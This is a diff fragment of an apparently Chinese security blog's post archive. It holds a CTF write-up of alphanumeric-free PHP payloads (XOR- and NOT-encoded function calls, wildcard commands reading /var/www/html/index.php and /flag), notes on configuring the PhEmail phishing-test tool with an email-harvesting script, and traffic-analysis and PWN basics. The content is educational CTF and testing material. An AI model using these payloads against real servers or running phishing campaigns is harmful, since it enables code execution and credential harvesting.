-<h3 id="index-php内容修改"><a href="#index-php内容修改" class="headerlink" title="index.php内容修改"></a>index.php内容修改</h3><h4 id="修改域名"><a href="#修改域名" class="headerlink" title="修改域名"></a>修改域名</h4><p>修改位置在index.php中有提示：<br><img src="/2018/08/15/PhEmail-%E9%82%AE%E4%BB%B6%E9%92%93%E9%B1%BC%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%E5%AE%9E%E9%99%85%E4%BD%BF%E7%94%A8%E8%B8%A9%E8%BF%87%E7%9A%84%E5%9D%91/change_domain.PNG" alt><br>将其中的dionach.com修改为收件人邮箱的域名。</p>
-<h4 id="修改重定向"><a href="#修改重定向" class="headerlink" title="修改重定向"></a>修改重定向</h4><p>在index.php末尾存在重定向方法，可以将此url改为你想要重定向的url，如www.baidu.com<br><img src="/2018/08/15/PhEmail-%E9%82%AE%E4%BB%B6%E9%92%93%E9%B1%BC%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%E5%AE%9E%E9%99%85%E4%BD%BF%E7%94%A8%E8%B8%A9%E8%BF%87%E7%9A%84%E5%9D%91/重定向.PNG" alt></p>
-<h4 id="修改记录log文件保存位置"><a href="#修改记录log文件保存位置" class="headerlink" title="修改记录log文件保存位置"></a>修改记录log文件保存位置</h4><p>index.php中将log文件保存在/tmp目录中，若使用windows搭建网站服务，则不存在/tmp目录,直接将log文件保存在当前目录，删除下面代码中的”/tmp/“<br><img src="/2018/08/15/PhEmail-%E9%82%AE%E4%BB%B6%E9%92%93%E9%B1%BC%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%E5%AE%9E%E9%99%85%E4%BD%BF%E7%94%A8%E8%B8%A9%E8%BF%87%E7%9A%84%E5%9D%91/log文件位置.PNG" alt></p>
-<h2 id="整理log日志"><a href="#整理log日志" class="headerlink" title="整理log日志"></a>整理log日志</h2><p>若收件人点击后php获取了如下一系列信息：<br><img src="/2018/08/15/PhEmail-%E9%82%AE%E4%BB%B6%E9%92%93%E9%B1%BC%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%E5%AE%9E%E9%99%85%E4%BD%BF%E7%94%A8%E8%B8%A9%E8%BF%87%E7%9A%84%E5%9D%91/log信息.PNG" alt><br>若存在多个文件，并想提取其中的email地址，并去重，于是写了一个小脚本进行提取email去重：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-*- conding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">regex = <span class="string">r&quot;([a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+)&quot;</span></span><br><span class="line"></span><br><span class="line">filepth = sys.argv[<span class="number">1</span>]</span><br><span class="line">file = os.listdir(filepth)</span><br><span class="line">allinemail = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> filename <span class="keyword">in</span> file:</span><br><span class="line">    <span class="keyword">with</span> open(filepth+filename,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        emails = re.findall(regex,f.read())</span><br><span class="line">        allemail = list(set(emails))</span><br><span class="line">        <span class="keyword">for</span> e <span class="keyword">in</span> allemail:</span><br><span class="line">            <span class="keyword">if</span> e <span class="keyword">not</span> <span class="keyword">in</span> allinemail:</span><br><span class="line">                allinemail.append(e)</span><br><span class="line">    f.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;email_result.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> w:</span><br><span class="line">    <span class="keyword">for</span> email <span class="keyword">in</span> allinemail:</span><br><span class="line">        w.write(email+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">w.close()</span><br></pre></td></tr></table></figure></p>
+<h2 id="0x02-无数字字母构造payload"><a href="#0x02-无数字字母构造payload" class="headerlink" title="0x02 无数字字母构造payload"></a>0x02 无数字字母构造payload</h2><p>首先，看到不能存在字母数字就想到了phithon师傅的文章里关于无字母数字webshell提到的3种方法提供了两种思路：</p>
+<ol>
+<li>利用位运算</li>
+<li>利用自增运算符<br>想到payload应该是code=getFlag(),于是开始构造getFlag()。<br>在网上找到一个payload如下：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$_&#x3D;&quot;&#123;&#123;&#123;&#123;&#123;&#123;&#123;&quot;^&quot;%1c%1e%0f%3d%17%1a%1c&quot;;$_();</span><br></pre></td></tr></table></figure>
+分析：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">采用异或运算</span><br><span class="line">&#123; ^ %1c &#x3D; g</span><br><span class="line">&#123; ^ %1e &#x3D; e</span><br><span class="line">&#123; ^ %0f &#x3D; t</span><br><span class="line">&#123; ^ %3d &#x3D; F</span><br><span class="line">&#123; ^ %17 &#x3D; l</span><br><span class="line">&#123; ^ %1a &#x3D; a</span><br><span class="line">所以&quot;&#123;&#123;&#123;&#123;&#123;&#123;&#123;&quot;^&quot;%1c%1e%0f%3d%17%1a%1c&quot; &#x3D; getFlag</span><br><span class="line">$_&#x3D;getFlag将_赋值为getFlag，最终得到getFlag()。</span><br></pre></td></tr></table></figure>
+还有个payload为<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?code&#x3D;$_&#x3D;~%98%9A%8B%B9%93%9E%98;$_();</span><br></pre></td></tr></table></figure>
+直接取反getFlag再url编码。<br>其中_可以使用汉字代替，如<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$啊&#x3D;~%98%9A%8B%B9%93%9E%98;$啊();</span><br></pre></td></tr></table></figure>
+当不过滤<strong>$</strong>符号时,可以这样操作，但是<strong>$</strong>符号过滤了，参考p牛的《无字母数字webshell之提高篇》中讲到PHP7是允许使用($a)()来执行动态函数;<br>此时，测试使用phpinfo();payload如下：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(~%8F%97%8F%96%91%99%90)();</span><br></pre></td></tr></table></figure>
+使用php5进行测试时如下：<br><img src="/2018/10/11/CTF%E4%B8%80%E9%81%93web%E9%A2%98%E5%B0%8F%E7%BB%93-%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8DgetFlag/php5测试phpinfo.PNG" alt></li>
+</ol>
+<p>获取phpinfo信息失败。</p>
+<p>使用php7进行测试时如下：<br><img src="/2018/10/11/CTF%E4%B8%80%E9%81%93web%E9%A2%98%E5%B0%8F%E7%BB%93-%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8DgetFlag/php7测试phpinfo.PNG" alt></p>
+<p>获取phpinfo信息成功。</p>
+<h2 id="0x03-解题思路"><a href="#0x03-解题思路" class="headerlink" title="0x03 解题思路"></a>0x03 解题思路</h2><p>利用通配符调用Linux系统命令 来查看flag。<br>在Linux系统中可以使用? * 等字符来正则匹配字母：</p>
+<ul>
+<li>*可以代替0个及以上任意字符</li>
+<li>?可以代表1个任意字符</li>
+</ul>
+<p>可以使用?来代替字符：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;???&#x2F;??? &#x3D;&gt; &#x2F;bin&#x2F;cat</span><br></pre></td></tr></table></figure><br>用此来读取源码<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$_&#x3D;&#96;&#x2F;???&#x2F;???%20&#x2F;???&#x2F;???&#x2F;????&#x2F;?????.???&#96;;?&gt;&lt;?&#x3D;$_?&gt;</span><br><span class="line">&quot;&#x2F;bin&#x2F;cat &#x2F;var&#x2F;www&#x2F;html&#x2F;index.php&quot;</span><br></pre></td></tr></table></figure><br>为保持长度小于35且不存在$_,则将$_带入后面一个表达式，同时使用*来匹配最后文件<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?&gt;&lt;?&#x3D;&#96;&#x2F;???&#x2F;???%20&#x2F;???&#x2F;???&#x2F;????&#x2F;*&#96;?&gt;</span><br></pre></td></tr></table></figure><br>php使用短链接，其含义如下<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php echo &#96;&#x2F;bin&#x2F;cat &#x2F;var&#x2F;www&#x2F;html&#x2F;index.php&#96;?&gt;</span><br></pre></td></tr></table></figure><br>读取到源码发现存在如下函数：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function getFlag()&#123;</span><br><span class="line">	$flag &#x3D; file_get_contents(&#39;&#x2F;flag&#39;);</span><br><span class="line">	echo $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>最后直接读取flag文件。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?&gt;&lt;?&#x3D;&#96;&#x2F;???&#x2F;???%20&#x2F;????&#96;;?&gt;</span><br></pre></td></tr></table></figure></p>
+<h2 id="0x04-其它思考"><a href="#0x04-其它思考" class="headerlink" title="0x04 其它思考"></a>0x04 其它思考</h2><p>windows中将if(preg_match(“/[A-Za-z0-9_$]+/“,$code))过滤修改，去除对大写字母或小写的过滤，由于windows对大小写不敏感，可以在windows系统中尝试执行任意代码<br><img src="/2018/10/11/CTF%E4%B8%80%E9%81%93web%E9%A2%98%E5%B0%8F%E7%BB%93-%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8DgetFlag/windows执行任意代码.PNG" alt></p>
+<p>不对if(preg_match(“/[A-Za-z0-9_$]+/“,$code))进行修改，将whoami进行取反再url编码：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">~%88%97%90%9E%92%96</span><br></pre></td></tr></table></figure><br>则失败。<br><img src="/2018/10/11/CTF%E4%B8%80%E9%81%93web%E9%A2%98%E5%B0%8F%E7%BB%93-%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8DgetFlag/windows绕过失败.PNG" alt></p>
+<p>去除[A-Za-z0-9_$]同样也无法执行代码，可见在windows中对命令进行位运算后会执行失败。</p>
+<h2 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h2><p><a href="https://xz.aliyun.com/t/2597#toc-8">[红日安全]PHP-Audit-Labs题解之Day5-8</a><br><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">一些不包含数字和字母的webshell</a><br><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">无字母数字webshell之提高篇</a><br><a href="https://www.anquanke.com/post/id/154284">CTF题目思考—极限利用</a></p>
 ]]></content>
       <categories>
-        <category>工具使用</category>
+        <category>CTF</category>
       </categories>
       <tags>
-        <tag>PhEmail</tag>
-        <tag>邮件钓鱼</tag>
+        <tag>web</tag>
       </tags>
   </entry>
   <entry>
-    <title>流量分析入门</title>
-    <url>/2018/07/12/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%85%A5%E9%97%A8/</url>
-    <content><![CDATA[<h2 id="NetFlow"><a href="#NetFlow" class="headerlink" title="NetFlow"></a>NetFlow</h2><p>NetFlow是一种数据交换方式，由思科于1990年开发。其工作原理是：NetFlow利用标准的交换模式处理数据流的第一个IP包数据，生成NetFlow缓存，随后同样的数据基于缓存信息在同一个数据流中进行传输，不再匹配相关的访问控制等策略，NetFlow缓存同时包含了随后数据流的统计信息。<br><a id="more"></a></p>
-<h3 id="NetFlow输出格式"><a href="#NetFlow输出格式" class="headerlink" title="NetFlow输出格式"></a>NetFlow输出格式</h3><p>NetFlow输出格式为报头+一系列Flow流。报头包含序列号、记录数、系统时间等，Flow流包含IP地址、端口、路由信息等。</p>
-<p>一个IP数据包的Flow流至少定义了7个关键元素：</p>
+    <title>PWN学习笔记1--入门</title>
+    <url>/2018/12/12/PWN%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E5%85%A5%E9%97%A8/</url>
+    <content><![CDATA[<h1 id="0x00-pwn介绍"><a href="#0x00-pwn介绍" class="headerlink" title="0x00 pwn介绍"></a>0x00 pwn介绍</h1><p>  PWN是指二进制漏洞的发掘和利用，CTF中PWN题目一般出现在linux平台上<br><a id="more"></a></p>
+<h1 id="0x01-pwn所需的基础知识"><a href="#0x01-pwn所需的基础知识" class="headerlink" title="0x01 pwn所需的基础知识"></a>0x01 pwn所需的基础知识</h1><ul>
+<li>c语言</li>
+<li>汇编语言</li>
+<li>Python</li>
+<li>操作系统基础</li>
+<li>linux基本命令</li>
+</ul>
+<h2 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h2><p>IP/EIP/RIP：指向当前的命令地址<br>SP/ESP/RSP：指向栈的顶部<br>BP/EBP/RBP：指向栈的底部</p>
+<h2 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h2><p>一种后进先出的数据结构，用于调用函数过程中回复寄存器的状态。<br><img src="/2018/12/12/PWN%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E5%85%A5%E9%97%A8/栈.PNG" alt></p>
+<h2 id="大端与小端模式"><a href="#大端与小端模式" class="headerlink" title="大端与小端模式"></a>大端与小端模式</h2><p>以0x12345678为例（从左到右代表地址从低到高）</p>
 <ul>
-<li>源IP地址；</li>
-<li>目的IP地址；</li>
-<li>源端口号；</li>
-<li>目的端口号；</li>
-<li>第三层协议类型；</li>
-<li>TOS字段；</li>
-<li>网络设备输入/输出的逻辑端口。</li>
+<li>小端 \x78\x56\x34\x12</li>
+<li>大端 \x12\x34\x56\x78</li>
 </ul>
-<p>OSSIM提供可视化NetFlow图形界面，如下图：<br><img src="/2018/07/12/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%85%A5%E9%97%A8/NetFlow.png" alt></p>
-<h3 id="NetFlow监测恶意代码"><a href="#NetFlow监测恶意代码" class="headerlink" title="NetFlow监测恶意代码"></a>NetFlow监测恶意代码</h3><p>NetFlow数据流获取方便，当网络正常运行时，NetFlow数据流是有一定的规律性的，当网络中存在异常流量时，网络流量会发生异常的波动。<br>监测蠕虫的策略：选取几个不同时间段，若时间段内符合特征的Flow超过上限值，则为病毒。</p>
-<h3 id="反应网络运行的核心参数"><a href="#反应网络运行的核心参数" class="headerlink" title="反应网络运行的核心参数"></a>反应网络运行的核心参数</h3><ul>
-<li>平均每秒流量：如果网络内部存在大流量的攻击或P2P等大流量的下载等异常流量时，其数值会比正常时大很多。</li>
-<li>平均每秒包数：大部分的异常流量都会产生非常多的数据包数。</li>
-<li>数据包大小分布：64字节左右的小包和1500字节左右的大包的分布比例较小，小包过多，可能存在扫描、攻击行为，大包过多可能存在消耗带宽资源的大包DOS攻击行为。<br>*平均包长：网络内的平均包长会在500-700字节左右。</li>
-<li>TCP会话数、UDP会话数、IP地址个数、MAC地址个数。。。</li>
-</ul>
-<h2 id="WireShark"><a href="#WireShark" class="headerlink" title="WireShark"></a>WireShark</h2><p> WireShark是目前世界上最流行的网络分析工具，如下图：<br><img src="/2018/07/12/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%85%A5%E9%97%A8/WireShark.png" alt></p>
-<h3 id="界面详解"><a href="#界面详解" class="headerlink" title="界面详解"></a>界面详解</h3><p>1.过滤器规则：</p>
+<p>大端模式：PowerPC、IBM、Sun、大部分网络协议<br>小端模式：X86、DEC</p>
+<h1 id="0x02-栈溢出"><a href="#0x02-栈溢出" class="headerlink" title="0x02 栈溢出"></a>0x02 栈溢出</h1><p>栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致栈中与其相邻的变量的值被改变。这种问题是一种特定的缓冲区溢出漏洞。<br>发生栈溢出的基本前提是：</p>
 <ul>
-<li>tcp-&gt;只显示TCP协议的记录；</li>
-<li>http-&gt;只看HTTP协议的记录；</li>
-<li>ip.src ==192.168.1.102 -&gt;显示源地址为192.168.1.102的记录；</li>
-<li>ip.dst==192.168.1.102 -&gt;目标地址为192.168.1.10的记录；</li>
-<li>ip.addr == 42.121.252.58 -&gt;只显示与某主机的通信；</li>
-<li>tcp.port ==80-&gt;端口为80的；</li>
-<li>tcp.srcport == 80 -&gt;只显示TCP协议的源端口为80的；</li>
-<li>http.request.method==”GET”  -&gt;只显示HTTP GET方法的；</li>
-<li>eth.type == 0x806-&gt;只显示ARP报文，这个字段的值表示是ARP报文，如果是ip报文此值为0x8000（可在表达式中选取对应的16进制值）。</li>
+<li>程序必须向栈上写入数据</li>
+<li>写入的数据大小没有被良好地控制</li>
 </ul>
-<p>2.封包列表：<br>封包列表的面板中显示，编号，时间戳，源地址，目标地址，协议，长度，以及封包信息。</p>
-<p>3.封包的详细信息：<br>在封包信息中，每行对应的含义及在OSI模型中的对应关系如下：</p>
-<ul>
-<li>Frame:   物理层的数据帧概况  -&gt;对应OSI七层模型中的【物理层】</li>
-<li>Ethernet II: 数据链路层以太网帧头部信息  -&gt;对应OSI七层模型中的【数据链路层】</li>
-<li>Internet Protocol Version 4: 互联网层IP包头部信息  -&gt;对应OSI七层模型中的【网络层】</li>
-<li>Transmission Control Protocol:  传输层T的数据段头部信息，此处是TCP  -&gt;对应OSI七层模型中的【传输层】</li>
-<li>Hypertext Transfer Protocol:  应用层的信息，此处是HTTP协议  -&gt;对应OSI七层模型中的【应用层】</li>
-</ul>
-<h3 id="WireShark统计模块"><a href="#WireShark统计模块" class="headerlink" title="WireShark统计模块"></a>WireShark统计模块</h3><h4 id="捕获文件的属性"><a href="#捕获文件的属性" class="headerlink" title="捕获文件的属性"></a>捕获文件的属性</h4><p><img src="/2018/07/12/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%85%A5%E9%97%A8/文件属性.PNG" alt><br>这一菜单简单收集所有抓包数据，在定义了过滤条件的时候，将呈现过滤后的数据。当想要知道每秒的平均报文数或是字节数时，可以使用此工具。</p>
-<h4 id="Endpoint"><a href="#Endpoint" class="headerlink" title="Endpoint"></a>Endpoint</h4><p><img src="/2018/07/12/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%85%A5%E9%97%A8/统计_Endpoints.png" alt><br>此窗口中，能够看到第2,3,4层的endpoints，也就是以太网，IP, TCP或UDP。查看收发大量数据流的IP地址。</p>
-<h4 id="Conversations"><a href="#Conversations" class="headerlink" title="Conversations"></a>Conversations</h4><p><img src="/2018/07/12/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%85%A5%E9%97%A8/Conversations.PNG" alt><br>显示2层以太网统计数据，第3层IP统计数据，或第4层TCP或UDP统计数据，网络会话是两个指定终端之间的数据流。例如，IP会话是两个IP地址之间的所有数据流，TCP会话包含了所有TCP连接。</p>
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.cnblogs.com/Chilam007/p/6973990.html"> 抓包工具 - Wireshark（详细介绍与TCP三次握手数据分析）
-</a></p>
+<h1 id="0x03-参考"><a href="#0x03-参考" class="headerlink" title="0x03 参考"></a>0x03 参考</h1><p><a href="https://zhuanlan.zhihu.com/p/34665623">从零开始学CTF</a></p>
 ]]></content>
       <categories>
-        <category>工具使用</category>
+        <category>CTF</category>
       </categories>
       <tags>
-        <tag>NetFlow</tag>
-        <tag>WireShark</tag>
+        <tag>pwn</tag>
       </tags>
   </entry>
   <entry>
@@ -606,78 +678,6 @@
       <tags>
         <tag>逆向</tag>
         <tag>汇编</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>CTF一道web题小结-无数字字母getFlag()</title>
-    <url>/2018/10/11/CTF%E4%B8%80%E9%81%93web%E9%A2%98%E5%B0%8F%E7%BB%93-%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8DgetFlag/</url>
-    <content><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>最近遇到个CTF题目，分析后涨了波知识，题目如下：<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    $code = $_GET[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(strlen($code)&gt;<span class="number">35</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Long.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[A-Za-z0-9_$]+/&quot;</span>,$code))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;NO.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">eval</span>($code);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//$hint =  &quot;php function getFlag() to get flag&quot;;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br><a id="more"></a><br>分析代码，了解到我们需要满足两个条件：</p>
-<ol>
-<li>长度不能大于35</li>
-<li>不能存在数字字母_和$符号</li>
-</ol>
-<h2 id="0x02-无数字字母构造payload"><a href="#0x02-无数字字母构造payload" class="headerlink" title="0x02 无数字字母构造payload"></a>0x02 无数字字母构造payload</h2><p>首先，看到不能存在字母数字就想到了phithon师傅的文章里关于无字母数字webshell提到的3种方法提供了两种思路：</p>
-<ol>
-<li>利用位运算</li>
-<li>利用自增运算符<br>想到payload应该是code=getFlag(),于是开始构造getFlag()。<br>在网上找到一个payload如下：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$_&#x3D;&quot;&#123;&#123;&#123;&#123;&#123;&#123;&#123;&quot;^&quot;%1c%1e%0f%3d%17%1a%1c&quot;;$_();</span><br></pre></td></tr></table></figure>
-分析：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">采用异或运算</span><br><span class="line">&#123; ^ %1c &#x3D; g</span><br><span class="line">&#123; ^ %1e &#x3D; e</span><br><span class="line">&#123; ^ %0f &#x3D; t</span><br><span class="line">&#123; ^ %3d &#x3D; F</span><br><span class="line">&#123; ^ %17 &#x3D; l</span><br><span class="line">&#123; ^ %1a &#x3D; a</span><br><span class="line">所以&quot;&#123;&#123;&#123;&#123;&#123;&#123;&#123;&quot;^&quot;%1c%1e%0f%3d%17%1a%1c&quot; &#x3D; getFlag</span><br><span class="line">$_&#x3D;getFlag将_赋值为getFlag，最终得到getFlag()。</span><br></pre></td></tr></table></figure>
-还有个payload为<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?code&#x3D;$_&#x3D;~%98%9A%8B%B9%93%9E%98;$_();</span><br></pre></td></tr></table></figure>
-直接取反getFlag再url编码。<br>其中_可以使用汉字代替，如<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$啊&#x3D;~%98%9A%8B%B9%93%9E%98;$啊();</span><br></pre></td></tr></table></figure>
-当不过滤<strong>$</strong>符号时,可以这样操作，但是<strong>$</strong>符号过滤了，参考p牛的《无字母数字webshell之提高篇》中讲到PHP7是允许使用($a)()来执行动态函数;<br>此时，测试使用phpinfo();payload如下：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(~%8F%97%8F%96%91%99%90)();</span><br></pre></td></tr></table></figure>
-使用php5进行测试时如下：<br><img src="/2018/10/11/CTF%E4%B8%80%E9%81%93web%E9%A2%98%E5%B0%8F%E7%BB%93-%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8DgetFlag/php5测试phpinfo.PNG" alt></li>
-</ol>
-<p>获取phpinfo信息失败。</p>
-<p>使用php7进行测试时如下：<br><img src="/2018/10/11/CTF%E4%B8%80%E9%81%93web%E9%A2%98%E5%B0%8F%E7%BB%93-%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8DgetFlag/php7测试phpinfo.PNG" alt></p>
-<p>获取phpinfo信息成功。</p>
-<h2 id="0x03-解题思路"><a href="#0x03-解题思路" class="headerlink" title="0x03 解题思路"></a>0x03 解题思路</h2><p>利用通配符调用Linux系统命令 来查看flag。<br>在Linux系统中可以使用? * 等字符来正则匹配字母：</p>
-<ul>
-<li>*可以代替0个及以上任意字符</li>
-<li>?可以代表1个任意字符</li>
-</ul>
-<p>可以使用?来代替字符：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;???&#x2F;??? &#x3D;&gt; &#x2F;bin&#x2F;cat</span><br></pre></td></tr></table></figure><br>用此来读取源码<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$_&#x3D;&#96;&#x2F;???&#x2F;???%20&#x2F;???&#x2F;???&#x2F;????&#x2F;?????.???&#96;;?&gt;&lt;?&#x3D;$_?&gt;</span><br><span class="line">&quot;&#x2F;bin&#x2F;cat &#x2F;var&#x2F;www&#x2F;html&#x2F;index.php&quot;</span><br></pre></td></tr></table></figure><br>为保持长度小于35且不存在$_,则将$_带入后面一个表达式，同时使用*来匹配最后文件<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?&gt;&lt;?&#x3D;&#96;&#x2F;???&#x2F;???%20&#x2F;???&#x2F;???&#x2F;????&#x2F;*&#96;?&gt;</span><br></pre></td></tr></table></figure><br>php使用短链接，其含义如下<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php echo &#96;&#x2F;bin&#x2F;cat &#x2F;var&#x2F;www&#x2F;html&#x2F;index.php&#96;?&gt;</span><br></pre></td></tr></table></figure><br>读取到源码发现存在如下函数：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function getFlag()&#123;</span><br><span class="line">	$flag &#x3D; file_get_contents(&#39;&#x2F;flag&#39;);</span><br><span class="line">	echo $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>最后直接读取flag文件。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?&gt;&lt;?&#x3D;&#96;&#x2F;???&#x2F;???%20&#x2F;????&#96;;?&gt;</span><br></pre></td></tr></table></figure></p>
-<h2 id="0x04-其它思考"><a href="#0x04-其它思考" class="headerlink" title="0x04 其它思考"></a>0x04 其它思考</h2><p>windows中将if(preg_match(“/[A-Za-z0-9_$]+/“,$code))过滤修改，去除对大写字母或小写的过滤，由于windows对大小写不敏感，可以在windows系统中尝试执行任意代码<br><img src="/2018/10/11/CTF%E4%B8%80%E9%81%93web%E9%A2%98%E5%B0%8F%E7%BB%93-%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8DgetFlag/windows执行任意代码.PNG" alt></p>
-<p>不对if(preg_match(“/[A-Za-z0-9_$]+/“,$code))进行修改，将whoami进行取反再url编码：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">~%88%97%90%9E%92%96</span><br></pre></td></tr></table></figure><br>则失败。<br><img src="/2018/10/11/CTF%E4%B8%80%E9%81%93web%E9%A2%98%E5%B0%8F%E7%BB%93-%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8DgetFlag/windows绕过失败.PNG" alt></p>
-<p>去除[A-Za-z0-9_$]同样也无法执行代码，可见在windows中对命令进行位运算后会执行失败。</p>
-<h2 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h2><p><a href="https://xz.aliyun.com/t/2597#toc-8">[红日安全]PHP-Audit-Labs题解之Day5-8</a><br><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">一些不包含数字和字母的webshell</a><br><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">无字母数字webshell之提高篇</a><br><a href="https://www.anquanke.com/post/id/154284">CTF题目思考—极限利用</a></p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>PWN学习笔记1--入门</title>
-    <url>/2018/12/12/PWN%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E5%85%A5%E9%97%A8/</url>
-    <content><![CDATA[<h1 id="0x00-pwn介绍"><a href="#0x00-pwn介绍" class="headerlink" title="0x00 pwn介绍"></a>0x00 pwn介绍</h1><p>  PWN是指二进制漏洞的发掘和利用，CTF中PWN题目一般出现在linux平台上<br><a id="more"></a></p>
-<h1 id="0x01-pwn所需的基础知识"><a href="#0x01-pwn所需的基础知识" class="headerlink" title="0x01 pwn所需的基础知识"></a>0x01 pwn所需的基础知识</h1><ul>
-<li>c语言</li>
-<li>汇编语言</li>
-<li>Python</li>
-<li>操作系统基础</li>
-<li>linux基本命令</li>
-</ul>
-<h2 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h2><p>IP/EIP/RIP：指向当前的命令地址<br>SP/ESP/RSP：指向栈的顶部<br>BP/EBP/RBP：指向栈的底部</p>
-<h2 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h2><p>一种后进先出的数据结构，用于调用函数过程中回复寄存器的状态。<br><img src="/2018/12/12/PWN%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E5%85%A5%E9%97%A8/栈.PNG" alt></p>
-<h2 id="大端与小端模式"><a href="#大端与小端模式" class="headerlink" title="大端与小端模式"></a>大端与小端模式</h2><p>以0x12345678为例（从左到右代表地址从低到高）</p>
-<ul>
-<li>小端 \x78\x56\x34\x12</li>
-<li>大端 \x12\x34\x56\x78</li>
-</ul>
-<p>大端模式：PowerPC、IBM、Sun、大部分网络协议<br>小端模式：X86、DEC</p>
